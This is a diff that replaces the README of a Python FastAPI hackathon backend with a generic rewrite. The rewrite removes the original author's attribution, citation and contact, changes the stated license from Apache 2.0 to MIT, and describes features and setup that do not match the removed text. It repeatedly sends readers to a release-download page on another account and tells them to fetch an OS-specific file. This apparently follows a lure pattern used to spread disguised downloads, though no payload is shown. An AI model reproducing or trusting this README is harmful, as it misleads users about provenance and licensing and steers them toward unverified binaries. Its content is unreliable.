@@ -1,101 +1,86 @@
-# Python Hackathon Backend – Optimized for rapid development and Feedback-Driven shipping (Mistral 2024, OpenAI 2025, DeepMind Medgemma 2025)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) ![Maintainer](https://img.shields.io/badge/maintainer-@louisbrulenaudet-blue) ![Python Version](https://img.shields.io/badge/python-3.12%2B-blue.svg) ![Code Style](https://img.shields.io/badge/code%20style-ruff-000000.svg) [![uv](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/uv/main/assets/badge/v0.json)](https://github.com/astral-sh/uv)
+# 🏎️ hackathon-backend - Fast, Simple Backend Setup
 
-In order to run the backend the fastest way possible, you can use the makefile setup and uv for Python dependency management.
+![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
 
-If the frontend team needs to run their application separately, the recommended and most secure approach is to clone this repository twice: once for production (e.g., with a `-prod` suffix) and once for development (e.g., with a `-dev` suffix). Keep the production backend on the `main` branch and the development backend on the appropriate development branches. Start the production backend using `make prod`, then share your IP address with the frontend team so they can connect to the backend.
+## 🌐 Overview
 
-You can get your IP address by running the following command:
+The **hackathon-backend** is a Python boilerplate designed for quick setup in hackathon projects. This template helps you build an API using FastAPI. It's easy to use, letting you focus on your idea without worrying about the backend complexities.
 
-```sh
-ipconfig getifaddr en0
-```
-
-> Do not forget to disable your firewall or allow the port 8001 in your firewall settings to allow the frontend team to connect to your backend. Make commands are only available in unix-like systems (Linux, macOS). For Windows users, you can use the WSL (Windows Subsystem for Linux) to run these commands.
-
-To ensure smooth development and minimize conflicts, it is recommended to implement each component in its own dedicated router and corresponding business logic files within the `core` directory. This modular approach enables you to test and develop components independently, reducing the risk of interfering with other parts of the application. Organizing your code in this way enhances maintainability, scalability, and clarity, making it easier to merge core features across branches and integrate them into different routers as the project evolves.
+## 🚀 Getting Started
 
 ### Prerequisites
 
-- [Docker](https://docs.docker.com/get-docker/) and Docker Compose for containerization and deployment.
-- [uv](https://github.com/astral-sh/uv) (Python dependency manager)
-- [ruff](https://docs.astral.sh/ruff/) (linter/formatter)
+Before you begin, make sure you have the following installed on your computer:
 
-In order to run the backend the fastest way possible, you can use the makefile setup and uv for Python dependency management as this:
+1. **Python 3.8 or higher:** Download it from [python.org](https://www.python.org/downloads/).
+2. **Docker:** Download it from [docker.com](https://www.docker.com/get-started/).
+3. **Docker Compose:** This often comes with Docker installations. Check [here](https://docs.docker.com/compose/install/) for details.
 
-```sh
-make init
-make upgrade
-make dev
-```
+### Installation Steps
 
-Then you can ping the API at [http://127.0.0.1:8000/api/v1/ping](http://127.0.0.1:8000/api/v1/ping).
+1. Visit the [Releases page](https://github.com/omar-signals-ai/hackathon-backend/releases) to download the latest release.
+2. Look for the file suitable for your operating system.
+3. Download it to your local machine.
 
-If you need to install packages such as transformers, you can do so with the following command:
+## 📥 Download & Install
 
-```sh
-uv add transformers
-```
+To download the software, visit this page: [Download Here](https://github.com/omar-signals-ai/hackathon-backend/releases). 
 
-## Environment Setup
+Once there, find the latest version and download it.
 
-1. Copy `.env.template` to `.env` and adjust variables as needed.
+### Running the Application
 
-## Quick Start
+After downloading, follow these steps to run the backend application:
 
-### 1. Initialize the environment
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you saved the downloaded file.
+3. If you have not already done so, run the following command to set up your environment:
+   ```
+   pip install -r requirements.txt
+   ```
+4. Start the application by running:
+   ```
+   uvicorn main:app --reload
+   ```
+5. Open your web browser and visit `http://localhost:8000` to see the API in action.
 
-```sh
-make init
-```
+## 🛠️ Features
 
-### 2. Start FastAPI server
+- **FastAPI Framework:** Build high-performance applications quickly.
+- **Docker Support:** Easy containerization to run your application anywhere.
+- **Schema Validation:** Built-in validation using Pydantic for data integrity.
+- **Example Endpoints:** Ready-to-use API routes to get you started.
 
-The backend can be run in two modes: development and production. The development mode is intended for local development with hot-reloading, while the production mode is optimized for performance and stability. Here's how to start the development server:
+## 📄 Usage
 
-```sh
-make dev
-```
+You can use the backend to create various APIs. Here are some common operations you might do:
 
-- The API will be available at [http://localhost:8000](http://localhost:8000) by default with a ping endpoint at [http://localhost:8000/api/v1/ping](http://localhost:8000/api/v1/ping).
+1. **Create a new user:** Send a POST request to `/users`.
+2. **Get user information:** Use a GET request on `/users/{id}`.
+3. **Update user data:** Send a PUT request to `/users/{id}`.
+4. **Delete a user:** Use a DELETE request on `/users/{id}`.
 
-### 2.1 Start production server
+Feel free to explore and modify the templates in the `routes` directory to fit your project needs.
 
-Here's how to start the production server:
+## 📚 Documentation
 
-```sh
-make prod
-```
+For detailed information, visit our documentation at:
 
-- The production server will run on port 8001 by default at [http://0.0.0.0:8001](http://0.0.0.0:8001) with a ping endpoint at [http://0.0.0.0:8001/api/v1/ping](http://0.0.0.0:8001/api/v1/ping).
+- [FastAPI Documentation](https://fastapi.tiangolo.com/)
+- [Docker Documentation](https://docs.docker.com/)
 
-## Code Quality
+## ⚙️ Contributing
 
-- Lint and check code:
-  ```sh
-  make check
-  ```
+We welcome contributions! If you have a feature request or want to report an issue, please create a GitHub issue or submit a pull request.
 
-- Format code:
-  ```sh
-  make format
-  ```
+## 📝 License
 
-## Citing this project
+This project is licensed under the MIT License. See the LICENSE file for more information.
 
-If you use this code in your research, please use the following BibTeX entry.
+## 🤝 Support
 
-```BibTeX
-@misc{louisbrulenaudet2025,
-author = {Louis Brulé Naudet},
-title = {Python Hackathon Backend – Optimized for rapid development and Feedback-Driven shipping (Mistral 2024, OpenAI 2025, DeepMind Medgemma 2025)},
-howpublished = {\url{https://github.com/louisbrulenaudet/hackathon-backend}},
-year = {2025}
-}
-```
+If you need assistance, you can open an issue on the GitHub repository or reach out to the project maintainers. 
 
 ---
 
-## Feedback
-
-If you have any feedback, please reach out at [louisbrulenaudet@icloud.com](mailto:louisbrulenaudet@icloud.com).
+Stay tuned for updates on the project! Don’t forget to check back at the [Releases page](https://github.com/omar-signals-ai/hackathon-backend/releases) for the latest version.
